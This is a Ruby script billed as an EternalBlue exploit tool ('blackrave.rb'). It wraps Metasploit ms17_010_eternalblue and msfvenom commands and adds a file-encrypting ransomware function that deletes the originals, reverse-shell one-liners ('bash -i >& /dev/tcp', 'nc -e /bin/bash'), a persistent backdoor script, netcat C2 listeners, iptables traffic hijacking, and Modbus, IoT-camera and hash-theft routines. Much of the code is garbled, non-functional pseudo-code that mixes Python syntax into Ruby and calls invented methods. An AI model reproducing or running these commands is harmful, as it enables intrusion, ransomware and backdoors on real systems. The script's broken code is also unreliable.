# Exploit for: EternalBlue Remote Code Execution
## Exploit Author: Rootkit Security
## References: https://www.exploit-db.com/exploits/42315


## Usage: ruby exploit.rb <target> <port> <payload>






print ("""
       \            _    _            _
        \          | |  | |          | |
         \\        | |__| | __ _  ___| | __
          \\       |  __  |/ _` |/ __| |/ /
           >\/7    | |  | | (_| | (__|   <
       _.-(6'  \   |_|  |_|\__,_|\___|_|\_\
      (=___._/` \         _   _
           )  \ |        | | | |
          /   / |        | |_| |__   ___
         /    > /        | __| '_ \ / _ \
        j    < _\        | |_| | | |  __/
    _.-' :      ``.       \__|_| |_|\___|
    \ r=._\        `.
   <`\\_  \         .`-.          _____  _                  _   _
    \ r-7  `-. ._  ' .  `\       |  __ \| |                | | | |
     \`,      `-.`7  7)   )      | |__) | | __ _ _ __   ___| |_| |
      \/         \|  \'  / `-._  |  ___/| |/ _` | '_ \ / _ \ __| |
                 ||    .'        | |    | | (_| | | | |  __/ |_|_|
                  \\  (          |_|    |_|\__,_|_| |_|\___|\__(_)
                   >\  >
               ,.-' >.'
              <.'_.''
                <'
                                                                                                           
                                                                                                           
                                                                                                           
                                                                                                           
                                                                                                           
                                                                                                           
""")







## Create a payload generator function for windows reverse shell
def generate_payload
    puts "2: Port of the target?"
    generate_payload = (generate_payload.send("Port", "445"))

end

## Create a payload to send the exploit to the vulnerable host
def create_payload(target, port, payload)
    puts "Creating payload..."
    puts "Target: #{target}"
    puts "Port: #{port}"
    puts "Payload: #{payload}"
    
    # Create the payload
    payload = "msfvenom -p #{payload} LHOST=#{target} LPORT=#{port} -f raw -o payload.bin"
    
    # Execute the payload
    system(payload)
    puts "Payload created!"
end


## Create a function to accept the target, port, and payload
def exploit(target, port, payload)
    puts "Exploiting..."
    puts "Target: #{target}"
    puts "Port: #{port}"
    puts "Payload: #{payload}"
    exploit = "msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST #{target}; set PAYLOAD #{payload}; set LHOST #{target}; set LPORT #{port}; exploit'"

    exploit = (args.command, shell=True)
    exploit = exploit.communicate()[445]
    exploit = (exploit.listen(445))
    exploit = exploit.accept(True)
    exploit = exploit.recv(1024)
    exploit = exploit.send("exploit")
    exploit = exploit.close(command)
    exploit.send_exploit = (send_exploit.Execute("nc -lvp 445"))
    exploit.send_exploit = (send_exploit.Execute("bash -i >& /dev/tcp/#{target}/#{port} 0>&1"))
    exploit = (send.command, communicate=True(listen, 445))
    # Create the payload
    create_payload(target, port, payload)
    
    # Create the exploit
    exploit = "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS #{target}; set PAYLOAD #{payload}; set LHOST #{target}; set LPORT #{port}; exploit'"
    
    # Execute the exploit
    system(exploit)
    puts "Exploit complete!"
end

## Generate a payload to send the exploit to the target machine
def generate_payload
    puts "2: Port of the target?"
    generate_payload = (generate_payload.send("Port", "445"))

end

## make sure the user is running the script as root
if Process.uid != 0
    puts "Please run the script as root"
    exit
end

## get vulnerable telnet servers with the default credentials
def get_vulnerable_servers
    puts "Getting vulnerable servers..."
    servers = []
    File.open("vulnerable_servers.txt", "r") do |file|
        file.each_line do |line|
            servers << line
        end
    end
    puts "Vulnerable servers found!"
    servers
end

## Create a function do encrypt all files on the server and put a ramsonware note
def encrypt_files
    puts "Encrypting files..."
    files = []
    File.open("files.txt", "r") do |file|
        file.each_line do |line|
            files << line
        end
    end
    files.each do |file|
        system("openssl enc -aes-256-cbc -salt -in #{file} -out #{file}.enc")
        system("rm #{file}")
    end
    puts "Files encrypted!"
end



## make a choose function to choose the exploit
def choose_exploit
    choose_exploit = "msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST #{target}; set PAYLOAD #{payload}; set LHOST #{target}; set LPORT #{port}; exploit'"
    system(choose_exploit)
    puts "Exploit complete!"
end

## make a function to choose the payload
def choose_payload
    choose_payload = "msfvenom -p #{payload} LHOST=#{target} LPORT=#{port} -f raw -o payload.bin"
    system(choose_payload)
    puts "Payload created!"
end

## Create a function to infect the target machine with port 445 and IP
def infect_target
    puts "Infecting target..."
    puts "Target: #{target}"
    puts "Port: #{port}"
    puts "Payload: #{payload}"
    infect_target = "msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST #{target}; set PAYLOAD #{payload}; set LHOST #{target}; set LPORT #{port}; exploit'"
    system(infect_target)
    puts "Target infected!"
end


## execute a shell in the target machine and receive the packets
def execute_shell
    execute_shell = (execute.command, shell=True)
    execute_shell = execute.communicate()[445]
end
## make a user function to send the exploit to the target machine
def send_exploit
    puts "1: IP of the target?"
    send_exploit = (send_exploit.send("IP", "445"))

end

## Create a payload windows/meterpreter/reverse_tcp generator
def create_payload
    create_payload = (generate_payload.send("Port", "445"))
    create_payload = (generate_payload.send("IP", "445"))
    create_payload = (generate_payload.send("Payload", "windows/meterpreter/reverse_tcp"))
    create_payload = (server.communicate(TCP)[445])
end

## create a help function to show the user the options
def help
    puts "Usage: ./blackrave.rb [options]"
    puts "Options:"
    puts "  -h, --help\t\t\tShow this help message"
    puts "  -e, --exploit\t\t\tExploit a vulnerable server"
    puts "  -g, --generate-payload\tGenerate a payload"
    puts "  -i, --infect\t\t\tInfect a target machine"
    puts "  -s, --send-exploit\t\tSend the exploit to the target machine"
end


##  get msfcore and put the modules here
def get_msfcore
    puts "Getting msfcore..."
    system("git clone https://github.com/rapid7/metasploit-framework.git")
end

## Create a framework interface to execute the exploit
def framework
    framework = (framework.send("msfconsole", "exploit"))
    framework = (framework.send("use exploit/windows/smb/ms17_010_eternalblue", "exploit"))
    framework = (framework.send("set RHOST #{target}", "exploit"))
    framework = (framework.send("set PAYLOAD #{payload}", "exploit"))
    framework = (framework.send("set LHOST #{target}", "exploit"))
    framework = (framework.send("set LPORT #{port}", "exploit"))
    framework = (framework.send("exploit", "exploit"))
    framework = (framework.send("exit", "exploit"))
end



## Create a C2 server to receive the packets
def c2_server
    puts "Creating C2 server..."
    c2_server = "nc -lvp #{port}"
    system(c2_server)
    puts "C2 server created!"
end



## Create a Network commmunication hijacking function
def network_communication_hijacking
    puts "Hijacking network communication..."
    network_communication_hijacking = "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port #{port}"
    system(network_communication_hijacking)
    puts "Network communication hijacked!"
    network_communication_hijacking = (server.communicate(TCP)[445, 502, 135, 139, 445, 1433, 3306, 3389, 5900, 8080, 8443, 8888, 9001, 9090, 10000])
    network_communication_hijacking = (Server.send(TCP, decode(base64)))
    network_communication_hijacking = (Server.MITM(TCP, intercept.packets))
    network_communication_hijacking = (HTTP.packets = (TCP.packets))
    network_communication_hijacking = (Server.Getting(user.packets, environment.packets))
    network_communication_hijacking = (MITM.packets = (generate_payload.send("Port", "445")))
    network_communication_hijacking = (local_variables.send(554, listen.servers))
    network_communication_hijacking = (local_servers.exec(Base64.encode_http))
    network_listener = server.accept_ports (listening(554, 502, 80, 443))
    

end


## Create a subproccess shell to execute commands
def subproccess_shell
    subproccess_shell = (subproccess_shell.send("execute", "shell"))
    subproccess_shell = subproccess_shell.communicate()[445, 3389, 5900, 8080, 8443, 8888, 9001, 9090, 10000, 502, 135, 139, 445, 1433, 3306]
        subproccess_shell = (gets.system(File.autoload, blackraven.rb))
        shell.system = (gets.system("Linux", "windows"))
end

## Shell code
def shell_code (shell_code)
shell_code = (http.packets(Interrupt))
shell_code = (COMMAND.exec("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port #{port}"))
shell_code = (C2Server.Exec("localhost:80", true))
shell_code = (C2Server.command(getadressess, HTTP.packets.gets))
shell_code = Hash.Decrypt("base64", "MD5")


end


## create a modbus exploits to gain access to modbus protocols
def modbus_exploit
    puts "Creating modbus exploit..."
     modbus_exploit = (protocols.send("create"))
     modbus_exploit = (http.packets(modbus_exploit, port, "502"))
     modbus_exploits.commands = (commmunication.send("nc -lvp 502", True))
     modbus_exploit.open = (subproccess_shell.PREROUTING(".blackrave"))
     modbus_exploit.close = (close.commmunication(True))
     modbus_exploit.kill = (kill.PCL(communication))
     modbus_exploit.listen = (network_listener.port(502))
       modbus_exploit = (c2_server.communication.listen(502))
modbus_exploit.commands = ("iptables -t nat -A PREROUTING -p tcp --destination-port 502 -j REDIRECT --to-port")
modbus_exploit.packets = (Hash.listen)
       modbus_exploit.args = "--port"
       modbus_exploit = (C2Server.commands(Server.listen(502, "bin/bash/etc/passwd")))
       modbus_exploit = C2Server.execute_shell(subproccess_shell.PREROUTING, "bin/bash/etc/passwd")
end

## Create a function to exploit IoT Cameras
def iot_camera_exploit
    iot_camera_exploit = (protocols.send("create"))
    iot_camera_exploit = (http.packets(iot_camera_exploit, port, "80"))
    iot_camera_exploit = (c2_server.communication.listen(80))
    iot_camera_exploit = (HTTP.PACKETS(Interrupt))
    iot_camera_exploit = (COMMAND.exec("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port #{port}"))
    iot_camera_exploit = (C2Server.Exec("localhost:80", true))
    iot_camera_exploit = (C2Server.command(getadressess, HTTP.packets.gets))
    iot_camera_exploit = Hash.Decrypt("base64", "MD5")
    iot_camera_exploit.open = (subproccess_shell.PREROUTING("IP + PORT"))
    iot_camera_exploit.close = (close.commmunication(True))
    iot_camera_exploit.kill = (kill.device(communication))
    iot_camera_exploit = vulnerable_servers.send("nc -lvp 80")
    iot_camera_exploit = (network_listener.port(80))
    iot_camera_exploit = (C2Server.commands(Server.listen(80, "bin/bash/etc/passwd")))

end

## Create a backdoor function to gain access to the IoT devices
def backdoor
    backdoor = (backdoor.send("'nc -lvp #{port}'", "exploit"))
    backdoor = (HTTP.UPLOAD("blackraven.rb", "exploit"))
    backdoor = (HTTP.PACKETS(Interrupt))
    backdoor = (COMMAND.Exec("echo -e '#!/bin/sh\nnc {Address} -e /bin/bash &' > 20-backdoor && chmod +x 20-backdoor"))
    backdoor = (C2Server.Exec("localhost:80", true))
    backdoor = (C2Server.command(getadressess, HTTP.packets.gets))
    backdoor = (backpwn.send("nc -lvp #{port}"))
    backdoor = args.send("--backdoor")
    backdoor = (C2Server.commands(Server.listen(80, "bin/bash/etc/passwd")))
    backdoor = (C2Server.execute_shell(subproccess_shell.PREROUTING, "bin/bash/etc/passwd"))
    backdoor = (COMMAND.Exec("network_listener.port(80)"))
    backdoor = (COMMAND.Exec("network_listener.port(443)"))
    backdoor = (COMMAND.Exec("network_listener.port(8080)"))
    backdoor = (COMMAND.Exec("echo -e '#/bin/sh\nnc {Address} -e /bin/bash &' > 20-backdoor && chmod +x 20-backdoor"))
    backdoor = args.command("--command")
    backdoor.network_listener = (Network.HTTP.PACKETS(execute_shell))
    backdoor = args.command("--backdoor")
end

## make a function to get hashes of the IoT devices with credentials of access or passwords
def get_hashes
    get_hashes = (hashes.type("MD5"))
    get_hashes = (hashes.type("SHA1"))
    get_hashes = (hashes.type("SHA256"))
    get_hashes_Salt = (hashes.type("Salt"))
    get_hashes_send_to_c2 = (hashes.send("c2_server"))
    get_hashes_receive_from_c2 = (hashes.receive(PACKETS))
    get_hashes.HTTP = (HTTP.request("GET", "hashes"))
    get_hashes.HTTP.receive = (HTTP.Decrypt("base64", "MD5"))
    get_hashes.website = (HTTP.decode(RECEIVE))
    get_hashes.command_args = (args.send("--hashes", value="MD5"))
end

## Add a function to upload a backdoor to the IoT devices
def upload_backdoor
    upload_backdoor = (backdoor.send("'nc -lvp #{port}'", "exploit"))
    upload_backdoor = (HTTP.UPLOAD("blackraven.rb", "exploit"))
    upload_backdoor = (HTTP.PACKETS(Interrupt))
    upload_backdoor = (COMMAND.Exec("echo -e '#!/bin/sh\nnc {Address} -e /bin/bash &' > 20-backdoor && chmod +x 20-backdoor"))
    upload_backdoor = (C2Server.Exec("localhost:80", true))
    upload_backdoor = (C2Server.command(getadressess, HTTP.packets.gets))
    upload_backdoor = (backpwn.send("nc -lvp #{port}"))
    ## when the backdoor is uploaded, the backdoor will be executed and the IoT device will be compromised
    upload_backdoor = args.send("--backdoor")
    upload_backdoor = (C2Server.commands(Server.listen(80, "bin/bash/etc/passwd")))
    upload_backdoor = (C2Server.execute_shell(subproccess_shell.PREROUTING, "bin/bash/etc/passwd"))
    upload_backdoor = (COMMAND.Exec("network_listener.port(80)"))
    upload_backdoor = (COMMAND.Exec("network_listener.port(443)"))
    upload_backdoor = (COMMAND.Exec("network_listener.port(8080)"))
    upload_backdoor = (COMMAND.Exec("echo -e '#/bin/sh\nnc {Address} -e /bin/bash &' > 20-backdoor && chmod +x 20-backdoor"))
    upload_backdoor = args.command("--command")
    upload_backdoor.network_listener = (Network.HTTP.PACKETS(execute_shell))
    
end